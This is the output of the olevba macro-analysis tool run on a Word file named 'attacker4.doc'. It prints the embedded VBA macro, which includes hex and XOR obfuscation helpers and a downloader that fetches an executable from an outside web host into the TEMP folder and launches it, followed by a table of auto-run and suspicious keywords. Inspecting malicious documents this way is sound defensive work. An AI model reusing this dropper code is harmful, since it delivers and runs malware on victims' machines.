pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: attacker4.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: attacker4.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function Hextostring(ByVal string1 As String) As String
	Dim tmpString As String
	Dim returnString As String
	Dim index As Long
	For index = 1 To Len(string1) Step 2
		tmpString = Chr$(Val(Chr$(38) & Chr$(72) & Mid$(string1, index, 2)))
		returnString = returnString & tmpString
		Next index
		Hextostring = returnString
		
	End Function

Function ZUWSBYDOTWV(ByVal string1 As String, ByVal string2 As String) As Boolean
	Dim xmlhttp  As Object, LSFYHUDVCYR As Long, QSBXXUZTKRD As Long, responseRequest() As Byte
	Set xmlhttp  = CreateObject("MSXML2.XMLHTTP")
	xmlhttp.Open "GET", string1, False
	xmlhttp.Send "gVHBnk"
	responseRequest = xmlhttp.responseBody

	QSBXXUZTKRD = FreeFile
	Open string2 For Binary As #QSBXXUZTKRD
	Put #QSBXXUZTKRD, , responseRequest
	Close #QSBXXUZTKRD

	Set Wscript = CreateObject("Shell.Application")
	Wscript.Open Environ("TEMP\DYIATHUQLCW.exe")
	
End Function


Sub IOWZJGNTSGK()
    gGHBkj = "http://gv-roth.de/js/bin.exe"
    ZUWSBYDOTWV gGHBkj, Environ("TEMP\DYIATHUQLCW.exe")
End Sub

Public Function XORI(ByVal string1 As String, ByVal string2 As String) As String
	Dim index As Long
	For index = 1 To Len(string1)
		XORI = XORI & Chr(Asc(Mid(string2, IIf(index Mod Len(string2) <> 0, index Mod Len(string2), Len(string2)), 1)) Xor Asc(Mid(string1, index, 1)))
		Next index
	End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|rgAri               |7267417269                                   |
|Hex String|GpocN               |47706F634E                                   |
|Hex String|LYmT                |4C596D54                                     |
|Hex String|QbBp                |51624270                                     |
|Hex String|hzwS                |687A7753                                     |
|Hex String|NSPb                |4E535062                                     |
|Hex String|jeHQqJd             |6A654851714A64                               |
|Hex String|MsBCAFq             |4D734243414671                               |
+----------+--------------------+---------------------------------------------+